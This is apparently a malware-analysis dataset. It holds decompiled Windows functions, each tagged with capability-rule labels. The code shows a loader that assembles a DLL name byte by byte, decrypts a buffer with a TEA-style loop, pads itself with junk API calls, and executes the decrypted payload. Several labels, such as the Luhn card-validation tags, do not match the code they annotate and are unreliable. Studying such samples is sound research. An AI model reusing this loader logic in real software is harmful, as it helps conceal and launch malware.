{
    "00404bad": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.00404bad(void)\n\n{\n    *0x4345a1 = 0x6c;\n    *0x43459b = 0x6d;\n    *0x43459a = 0x69;\n    *0x43459c = 0x67;\n    *0x4345a0 = 100;\n    *0x4345a3 = 0;\n    *0x43459d = 0x33;\n    *0x434599 = 0x73;\n    *0x4345a2 = 0x6c;\n    *0x43459f = 0x2e;\n    *0x43459e = 0x32;\n    *0x434598 = 0x6d;\n    (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x434598);\n    return;\n}\n",
        "token_count": 192
    },
    "00404c17": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404c17(uint32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *0x41945c;\n    iVar1 = *0x419458;\n    var_ch = *arg_8h;\n    uVar4 = arg_8h[1];\n    fcn.00404c0d();\n    var_1ch = 0x23f;\n    if (*0x435864 == 0x14) {\n        (*_sym.imp.ADVAPI32.dll_BackupEventLogA)(0, 0);\n    }\n    iVar3 = *0x419460;\n    var_20h = 0x20;\n    do {\n        if (*0x435864 == 0xfa9) {\n            *0x4356c4 = 0xedeb2e40;\n        }\n        if (*0x435864 == 0x3eb) {\n            *0x43562c = 0;\n        }\n        *0x4356c0 = 0xf4ea3dee;\n        fcn.00404c14();\n        if (*0x435864 == 0x9e6) {\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        if (*0x435864 == 0x213) {\n            (*_sym.imp.KERNEL32.dll_WaitNamedPipeA)(0x404030, 0);\n            (*_sym.imp.KERNEL32.dll_AssignProcessToJobObject)(0, 0);\n            (*_sym.imp.KERNEL32.dll_GetFullPathNameA)(0, 0, 0, 0);\n        }\n        uVar4 = uVar4 - (var_ch >> 5 ^ var_ch * 0x10 + iVar3 ^ var_ch + var_1ch);\n        *0x4345cc = 0;\n        var_ch = var_ch - (uVar4 * 0x10 + iVar1 ^ var_1ch + uVar4 ^ (uVar4 >> 5) + iVar2);\n        var_1ch = var_1ch + 0x61c88647;\n        var_20h = var_20h + -1;\n    } while (var_20h != 0);\n    arg_8h[1] = uVar4;\n    *arg_8h = var_ch;\n    return;\n}\n",
        "token_count": 626
    },
    "00404d95": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.00404d95(void)\n\n{\n    int32_t arg_8h;\n    uint var_810h;\n    uint lpDestStr;\n    uint var_10h;\n    uint lpNumberOfCharsWritten;\n    uint32_t var_8h;\n    uint dwWriteCoord;\n    \n    arg_8h = *0x435630;\n    for (var_8h = *0x435864 >> 3; var_8h != 0; var_8h = var_8h - 1) {\n        if (*0x435864 == 0x959) {\n            (*_sym.imp.KERNEL32.dll_SetProcessWorkingSetSize)(0, 0, 0);\n            dwWriteCoord = 0;\n            (*_sym.imp.KERNEL32.dll_FillConsoleOutputCharacterA)(0, 0, 0, 0, &lpNumberOfCharsWritten);\n            (*_sym.imp.KERNEL32.dll_WriteConsoleW)(0, 0, 0, &var_10h, 0);\n            (*_sym.imp.KERNEL32.dll_LCMapStringA)(0, 0, 0, 0, &lpDestStr, 0);\n            (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0);\n            (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0);\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasesA)(&var_810h, 0, 0);\n            (*_sym.imp.KERNEL32.dll_GetFileInformationByHandle)(0, 0);\n        }\n        fcn.00404c17(arg_8h);\n        arg_8h = arg_8h + 8;\n    }\n    return;\n}\n",
        "token_count": 368
    },
    "00404f19": {
        "rules": [
            "search for credit card data/ac143e9ae29c414184a69c9308e24693",
            "parse credit card information/f44d27b3cce043409e5315cf54d1899b"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: dwWriteCoord\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: lpNumberOfCharsWritten\n\nvoid fcn.00404f19(void)\n\n{\n    code *pcVar1;\n    int32_t extraout_ECX;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint lpszVolumePathName;\n    uint var_114ch;\n    uint var_94ch;\n    uint lpVolumeNameBuffer;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint *var_74h;\n    uint var_70h;\n    uint *var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint *var_58h;\n    uint var_54h;\n    uint *var_50h;\n    uint *var_4ch;\n    uint *var_48h;\n    uint *var_44h;\n    uint var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint lpValue;\n    uint32_t var_10h;\n    uint lpNumberOfCharsWritten;\n    int32_t var_8h;\n    uint dwWriteCoord;\n    \n    dwWriteCoord = 0x404f26;\n    fcn.0040d280();\n    lpNumberOfCharsWritten = unaff_EDI;\n    var_8h = unaff_ESI;\n    dwWriteCoord = unaff_EBX;\n    if (*0x435864 == 0x412) {\n        var_10h = 0;\n        lpValue = 0;\n        var_18h = 0;\n        var_1ch = NULL;\n        var_20h = 0;\n        var_24h = 0;\n        var_28h = 0;\n        var_2ch = 0;\n        var_30h = NULL;\n        var_34h = 0x404f46;\n        (*_sym.imp.ADVAPI32.dll_ReportEventW)();\n        var_34h = NULL;\n        var_38h = 0x404f4d;\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)();\n        var_10h = 0;\n        lpValue = 0x404f53;\n        fcn.00405dac(0);\n        lpValue = 0;\n        var_18h = 0x404f59;\n        fcn.00405dc2();\n        var_18h = 0;\n        var_1ch = 0x404f5f;\n        fcn.00405ef4(0);\n    }\n    *0x435864 = *0x435864 + 0xb2d3b;\n    var_10h = *0x435864;\n    lpValue = 0;\n    var_18h = 0x404f79;\n    *0x435630 = (*_sym.imp.KERNEL32.dll_LocalAlloc)();\n    var_18h = 0x404f83;\n    fcn.00404e64();\n    uVar2 = 0;\n    if (*0x435864 != 0) {\n        do {\n            (*0x435630)[uVar2] = *(*0x435868 + 0xb2d3b + uVar2);\n            if (*0x435864 == 0x292) {\n                var_18h = 0x404070;\n                var_1ch = NULL;\n                var_20h = 0x404fba;\n                (*_sym.imp.KERNEL32.dll_CreateJobObjectW)();\n            }\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *0x435864);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_FoldStringW;\n    iVar3 = 0;\n    do {\n        if (*0x435864 + iVar3 == 0x5e) {\n            var_18h = 0;\n            var_1ch = 0x4040bc;\n            var_20h = 0x404fe3;\n            (*_sym.imp.KERNEL32.dll_SetFileAttributesA)();\n            var_20h = 0;\n            var_24h = 0;\n            var_28h = 0;\n            var_2ch = 0x404fec;\n            (*_sym.imp.KERNEL32.dll_GetProfileIntW)();\n            var_2ch = 0;\n            var_30h = &fcn.00404f19::var_114ch;\n            var_34h = NULL;\n            var_38h = 0x4040e0;\n            var_3ch = NULL;\n            var_40h = 0x404ffd;\n            (*pcVar1)();\n            var_40h = 0;\n            var_44h = &fcn.00404f19::var_94ch;\n            var_48h = &fcn.00404f19::lpNumberOfCharsWritten;\n            var_4ch = &fcn.00404f19::var_10h;\n            var_50h = &fcn.00404f19::var_18h;\n            var_54h = 0;\n            var_58h = &fcn.00404f19::lpVolumeNameBuffer;\n            var_5ch = 0;\n            var_60h = 0x405020;\n            (*_sym.imp.KERNEL32.dll_GetVolumeInformationA)();\n            var_60h = 0x404164;\n            var_64h = 0;\n            var_68h = 0;\n            var_6ch = 0x40502d;\n            (*_sym.imp.KERNEL32.dll_OpenJobObjectW)();\n            var_6ch = &fcn.00404f19::lpValue;\n            var_70h = 0;\n            var_74h = &fcn.00404f19::lpszVolumePathName;\n            var_78h = 0;\n            var_7ch = 0;\n            var_80h = 0;\n            var_84h = 0x405042;\n            (*_sym.imp.KERNEL32.dll_GetCalendarInfoW)();\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x40c893);\n    iVar3 = 0;\n    do {\n        var_18h = 0x405053;\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 < 0x1b9ca9b) {\n            var_e0h = 0x26994589;\n            var_f8h = 0x46721115;\n            var_e4h = 0x3b8c8b6a;\n            var_144h = 0x701071da;\n            var_dch = 0x4dde9e67;\n            var_138h = 0x2e27f6b9;\n            var_110h = 0x2de3b1b4;\n            var_5ch = 0xfe4109f;\n            var_28h = 0x6df25c1e;\n            var_c0h = 0x23420a38;\n            var_50h = 0x73b9f5d5;\n            var_104h = 0x78838e04;\n            var_b0h = 0x789f54e0;\n            var_130h = 0x723d872f;\n            var_88h = 0x2f4182c9;\n            var_48h = 0x6ad8ef0c;\n            var_94h = 0x3a6c434;\n            var_a4h = 0x11c906fe;\n            var_a8h = 0x402d3c3a;\n            dwWriteCoord = 0x347c6d6c;\n            var_38h = 0x11b0372a;\n            var_2ch = 0x2fbc9c79;\n            var_c4h = 0x583c1114;\n            var_80h = 0x17263a72;\n            var_24h = 0xce8ec49;\n            var_20h = 0x205defbb;\n            var_8h = 0x31df762c;\n            var_a0h = 0x3063220d;\n            var_68h = 0x2f8d2ea5;\n            var_140h = 0x123be14;\n            var_13ch = 0x22150baf;\n            var_8ch = 0x5cf25b83;\n            var_148h = 0x6950ea8;\n            lpValue = 0x63c398fe;\n            var_98h = 0x688827b4;\n            var_134h = 0x70571416;\n            var_14ch = 0x60f034a3;\n            var_100h = 0x7d50f5eb;\n            var_40h = 0x78cd8b6f;\n            var_78h = 0x1fd366fc;\n            var_12ch = 0x530f435e;\n            var_124h = 0x28187254;\n            var_9ch = 0x360de2c2;\n            var_11ch = 0x25b3a818;\n            var_e8h = 0xf083948;\n            var_84h = 0xc4ea71fb;\n            var_7ch = 0x95fc184c;\n            var_b4h = 0xb9e67668;\n            var_64h = 0xd97fbf54;\n            var_60h = 0x75312864;\n            var_74h = 0x9b918e6;\n            var_30h = 0x6d089d79;\n            var_58h = 0x62e20e91;\n            var_90h = 0x312d7b05;\n            var_120h = 0x502c0d7a;\n            lpNumberOfCharsWritten = 0xd0b9838e;\n            var_bch = 0x4d9918cb;\n            var_34h = 0xac031e25;\n            var_1ch = 0xb2c369fa;\n            var_54h = 0x236a8422;\n            var_cch = 0x27d74ece;\n            var_6ch = 0x16877e06;\n            var_ech = 0x9345ba97;\n            var_d4h = 0x923c9ab0;\n            var_f4h = 0x39df38a5;\n            var_4ch = 0x6c726a72;\n            var_ach = 0xea0d329b;\n            var_128h = 0x8dffb5dc;\n            var_108h = 0xd52b5741;\n            var_10ch = 0x352dbae8;\n            var_10h = 0x2ae3729b;\n            var_70h = 0xf1220f71;\n            var_3ch = 0xfb31a70d;\n            var_d8h = 0xe1741590;\n            var_114h = 0x8133d177;\n            var_b8h = 0x4bde3e0b;\n            var_fch = 0xf5c90699;\n            var_c8h = 0xbf5a1833;\n            var_118h = 0x725ddcf9;\n            var_f0h = 0x16afd6d;\n            var_d0h = 0xd8fb622e;\n            var_44h = 0x1801def6;\n        }\n        var_18h = 0x40580f;\n        (*_sym.imp.KERNEL32.dll_GetUserDefaultLCID)();\n    } while ((iVar3 < 0x1b3b167) && (iVar3 = iVar3 + 1,  iVar3 < 0x16f7eac0));\n    var_18h = 0x405829;\n    fcn.00404d95();\n    iVar3 = 0;\n    do {\n        if (iVar3 == 0x770e) {\n            var_18h = 0x405838;\n            fcn.00404e4a();\n            iVar3 = extraout_ECX;\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x286b97d);\n    iVar3 = 0x7b;\n    do {\n        if (*0x435864 == 0xf) {\n            var_18h = 0;\n            var_1ch = &fcn.00404f19::lpVolumeNameBuffer;\n            var_20h = 0;\n            var_24h = 0x40585c;\n            (*_sym.imp.KERNEL32.dll_AddConsoleAliasA)();\n        }\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_8h = 0x184cc;\n    do {\n        if (*0x435864 == 0x1833b) {\n            var_18h = 0;\n            var_1ch = &fcn.00404f19::lpszVolumePathName;\n            var_20h = 0x404180;\n            var_24h = 0x405889;\n            (*_sym.imp.KERNEL32.dll_GetVolumePathNameW)();\n            var_24h = 0;\n            var_28h = 0;\n            var_2ch = 0;\n            var_30h = 0x405892;\n            (*_sym.imp.KERNEL32.dll_FindFirstChangeNotificationA)();\n            var_30h = NULL;\n            var_34h = &fcn.00404f19::lpNumberOfCharsWritten;\n            var_38h = 0;\n            var_3ch = &fcn.00404f19::lpVolumeNameBuffer;\n            var_40h = 0;\n            var_44h = 0x4058a6;\n            (*_sym.imp.KERNEL32.dll_WriteConsoleW)();\n            var_44h = NULL;\n            var_48h = NULL;\n            var_4ch = 0x4058ae;\n            (*_sym.imp.KERNEL32.dll_GetComputerNameW)();\n            var_4ch = NULL;\n            var_50h = 0x4058b5;\n            (*_sym.imp.KERNEL32.dll_TlsGetValue)();\n            var_50h = NULL;\n            var_54h = 0;\n            var_58h = &fcn.00404f19::var_94ch;\n            var_5ch = 0x4058c4;\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasesA)();\n            var_5ch = 0;\n            var_60h = 0;\n            var_64h = 0x4058cc;\n            (*_sym.imp.KERNEL32.dll_EnumSystemCodePagesA)();\n            var_64h = 0;\n            var_68h = 0x4058d3;\n            (*_sym.imp.KERNEL32.dll_GetFileAttributesW)();\n            var_68h = 0;\n            var_6ch = NULL;\n            var_70h = 0;\n            var_74h = 0x4058dc;\n            (*_sym.imp.KERNEL32.dll_GetVolumeNameForVolumeMountPointW)();\n            dwWriteCoord = 0;\n            var_74h = &fcn.00404f19::var_10h;\n            var_78h = 0;\n            var_7ch = 0;\n            var_80h = 0;\n            var_84h = 0;\n            var_88h = 0x4058f7;\n            (*_sym.imp.KERNEL32.dll_FillConsoleOutputCharacterA)();\n            var_88h = 0;\n            var_8ch = 0;\n            var_90h = 0;\n            var_94h = 0;\n            var_98h = 0;\n            var_9ch = 0x4058fe;\n            (*pcVar1)();\n        }\n        var_8h = var_8h + -1;\n    } while (var_8h != 0);\n    var_18h = 0x40590c;\n    fcn.00404bad();\n    var_18h = 0x405912;\n    (**0x435630)();\n    return;\n}\n",
        "token_count": 4126
    },
    "00405a4b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00405a4b(char param_1)\n\n{\n    int32_t unaff_ESI;\n    \n    if ((param_1 != '\\0') && (7 < *(unaff_ESI + 0x18))) {\n        fcn.00405a92(*(unaff_ESI + 4));\n    }\n    *(unaff_ESI + 0x18) = 7;\n    fcn.00405a75();\n    return;\n}\n",
        "token_count": 100
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00407980": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00407a73: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00407a78)\n// WARNING: Removing unreachable block (ram,0x00407aa6)\n// WARNING: Removing unreachable block (ram,0x00407a7e)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00407980(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004075e8(0x416830, 0x18);\n    fcn.00406af0(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x433bb8 != 1) {\n        *0x433bb4 = 1;\n        *0x433bb0 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.00408c1d(*0x436a0c);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.00408c1d(*0x436a08);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.00408c14();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.00408c1d(*piVar2);\n                        iVar3 = fcn.00408c14();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.00408c1d(*0x436a0c);\n                        piVar1 = fcn.00408c1d(*0x436a08);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.004078ba(0x4011dc);\n        }\n        fcn.004078ba(0x4011e4);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00406a16(8);\n    }\n    return;\n}\n",
        "token_count": 803
    },
    "0040c6a5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c6a5(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x4185e8) {\n        return;\n    }\n    *0x4342b8 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x4342bc = &arg_8h;\n    *0x4341f8 = 0x10001;\n    *0x4341a0 = 0xc0000409;\n    *0x4341a4 = 1;\n    var_328h = *0x4185e8;\n    var_324h = *0x4185ec;\n    *0x4341ac = unaff_retaddr;\n    *0x434284 = in_GS;\n    *0x434288 = in_FS;\n    *0x43428c = in_ES;\n    *0x434290 = in_DS;\n    *0x434294 = unaff_EDI;\n    *0x434298 = unaff_ESI;\n    *0x43429c = unaff_EBX;\n    *0x4342a0 = in_EDX;\n    *0x4342a4 = in_ECX;\n    *0x4342a8 = in_EAX;\n    *0x4342ac = unaff_EBP;\n    *0x4342b0 = unaff_retaddr;\n    *0x4342b4 = in_CS;\n    *0x4342c0 = in_SS;\n    *0x4341f0 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040f1d2(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x403670);\n    if (*0x4341f0 == 0) {\n        fcn.0040f1d2(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 840
    },
    "0040ca99": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040ca99(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00406a16(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0040caf3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040caf3(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00408c14();\n    var_4h = 0;\n    if (*0x434148 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x401ca8);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x401c9c);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x434148 = fcn.00408ba2(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x401c8c);\n        *0x43414c = fcn.00408ba2(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x401c78);\n        *0x434150 = fcn.00408ba2(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x401c5c);\n        *0x434158 = fcn.00408ba2(uVar3);\n        if (*0x434158 != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x401c44);\n            *0x434154 = fcn.00408ba2(uVar3);\n        }\n    }\n    if ((*0x434154 != iVar1) && (*0x434158 != iVar1)) {\n        pcVar4 = fcn.00408c1d(*0x434154);\n        pcVar5 = fcn.00408c1d(*0x434158);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x0040cc35;\n        }\n    }\n    if ((((*0x43414c != iVar1) && (pcVar4 = fcn.00408c1d(*0x43414c),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x434150 != iVar1 && (pcVar4 = fcn.00408c1d(*0x434150),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x0040cc35:\n    pcVar4 = fcn.00408c1d(*0x434148);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 824
    },
    "0041296e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041296e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4185e8 ^ &stack0xfffffffc;\n    fcn.004088c1(arg_10h);\n    var_14h = fcn.00413b89(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00413101(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x004129c7:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00412a07;\n        }\n        if (iVar1 != 2) {\ncode_r0x004129f9:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00412a07;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x004129f9;\n        goto code_r0x004129c7;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00412a07:\n    fcn.0040c6a5(unaff_EBX);\n    return;\n}\n",
        "token_count": 505
    },
    "00412a16": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00412a16(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4185e8 ^ &stack0xfffffffc;\n    fcn.004088c1(arg_10h);\n    var_14h = fcn.00413b89(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00413645(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x00412a6f:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00412aaf;\n        }\n        if (iVar1 != 2) {\ncode_r0x00412aa1:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 